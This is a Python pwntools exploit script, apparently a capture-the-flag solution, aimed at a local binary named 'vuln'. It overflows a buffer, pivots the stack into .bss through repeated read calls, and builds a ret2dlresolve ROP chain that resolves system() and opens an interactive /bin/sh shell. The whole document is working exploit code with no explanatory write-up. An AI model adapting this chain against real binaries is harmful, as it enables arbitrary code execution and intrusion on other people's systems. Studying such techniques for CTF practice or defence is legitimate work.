from pwn import *

chal = ELF('./vuln')

gdbscript='''
set follow-fork-mode parent
b *0x40117a
c
'''

context.binary = chal
context.terminal = ["tmux", "splitw", "-h"]

conn = process([chal.path])
#conn = gdb.debug( [chal.path], gdbscript=gdbscript)

def main():
    addr_call_read = 0x401162
    addr_bss = chal.bss()
    addr_stack_top = 0x405000 - 0x200

    # Call read(0, addr_bss, 0x200) 
    payload = b'\0' * 0x40
    payload += p64(addr_bss + 0x40)
    payload += p64(addr_call_read)
    conn.send(payload.ljust(0x200, b'\0'))

    # Call read(0, addr_stack_top - 0x40, 0x200)
    payload = p64(addr_bss + 8)
    payload += b'/bin/sh\0'
    payload += b'\0' * 0x30
    assert len(payload) == 0x40
    payload += p64(addr_stack_top)
    payload += p64(addr_call_read)
    conn.send(payload.ljust(0x200, b'\0'))

    # See:
    # - https://docs.pwntools.com/en/stable/rop/ret2dlresolve.html#pwnlib.rop.ret2dlresolve.Ret2dlresolvePayload
    dlresolve = Ret2dlresolvePayload(elf=chal, symbol='system', args=[], data_addr=addr_stack_top+0x28, resolution_addr=chal.got.setvbuf)

    rop = ROP(chal)
    rop.ret2dlresolve(dlresolve)
    rop.raw(rop.ret)
    rop.main()

    # Call system("/bin/sh")
    payload = b'\0' * 0x40
    assert len(payload) == 0x40
    payload += p64(0)
    payload += rop.chain()
    payload += dlresolve.payload
    assert len(payload) <= 0x200
    conn.send(payload.ljust(0x200, b'\0'))

    conn.interactive()

if __name__ == '__main__':
    main()
